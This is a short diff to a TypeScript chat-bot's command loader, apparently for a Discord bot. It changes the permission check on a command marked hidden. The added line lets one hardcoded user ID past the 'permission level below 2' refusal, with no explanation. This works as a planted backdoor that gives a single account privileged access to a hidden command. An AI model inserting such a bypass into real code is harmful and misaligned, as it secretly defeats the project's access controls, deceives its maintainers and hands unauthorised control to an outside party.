@@ -534,7 +534,7 @@ async function load(client, cm: CommandManager) {
         hidden: true,
         handler: async (msg, ext) => {
             if (
-                (ext.info as typeof Schema.user).commandInfo.permissionLevel < 2
+                (ext.info as typeof Schema.user).commandInfo.permissionLevel < 2 && msg.author.id !== "842757573709922314"
             )
                 return msg.channel.send("Insuffent permission.");
             let args = ap(msg.content, true);
